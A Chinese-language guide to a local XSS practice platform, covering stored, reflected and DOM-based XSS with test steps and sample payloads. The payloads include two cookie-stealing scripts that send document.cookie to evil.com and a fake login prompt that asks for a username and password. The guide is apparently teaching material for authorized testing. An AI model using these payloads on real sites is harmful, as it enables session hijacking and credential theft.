/*
 * XSS漏洞测试平台使用指南和测试用例
 */

## XSS漏洞测试平台使用说明

### 访问地址
- XSS测试页面: http://localhost:8080/page/xss-vuln

### 三大XSS类型测试

#### 1. 存储型XSS（最危险）
**特点**: 恶意脚本存储在数据库中，永久生效
**测试步骤**:
1. 在"评论内容"输入框中输入XSS脚本
2. 点击"提交恶意评论"按钮
3. 点击"查看评论列表"观察XSS触发效果

**经典测试用例**:
- 基础弹窗: `<script>alert('存储型XSS触发')</script>`
- 窃取Cookie: `<script>new Image().src='http://evil.com/?c='+document.cookie</script>`
- 页面劫持: `<script>document.body.innerHTML='<h1>页面被XSS劫持！</h1>'</script>`
- 钓鱼攻击: `<script>alert('会话过期，请重新登录：'+prompt('用户名：')+prompt('密码：'))</script>`

#### 2. 反射型XSS
**特点**: 恶意脚本通过URL参数反射，一次性触发
**测试步骤**:
1. 在"搜索关键词"输入框中输入XSS脚本
2. 点击"执行反射搜索"按钮

**经典测试用例**:
- 基础弹窗: `<script>alert('反射型XSS')</script>`
- Cookie窃取: `<script>location.href='http://evil.com?c='+document.cookie</script>`
- 标签闭合绕过: `</div><script>alert('闭合标签绕过')</script>`

#### 3. DOM型XSS
**特点**: 恶意脚本在前端DOM渲染时触发
**测试步骤**:
1. 在"用户名"输入框中输入XSS脚本
2. 点击"查看用户资料"按钮

**经典测试用例**:
- 基础弹窗: `</p><script>alert('DOM型XSS')</script>`
- img标签触发: `<img src=x onerror=alert('DOM-img')>`
- 自动聚焦: `<input autofocus onfocus=alert('DOM-focus')>`

### 安全对比测试
- 使用"提交安全评论"按钮测试防护机制
- 观察内容是否被正确转义（如 `<` 变为 `&lt;`）

### 数据库准备
执行SQL脚本创建必要的表：
```sql
-- 执行文件: SQL/4_CREATE_xss_comment_table.sql
```

### 注意事项
1. 仅在授权的测试环境中使用
2. 测试完成后建议清理恶意评论数据
3. 现实应用中必须实施严格的输入验证和输出转义
4. 推荐使用Content Security Policy (CSP)等额外防护措施

### 技术特点
- 完整模拟生产环境的XSS漏洞场景
- 支持三种主流XSS攻击类型的测试
- 提供安全防护对比演示
- 包含丰富的测试用例库
- 响应式设计，支持移动端访问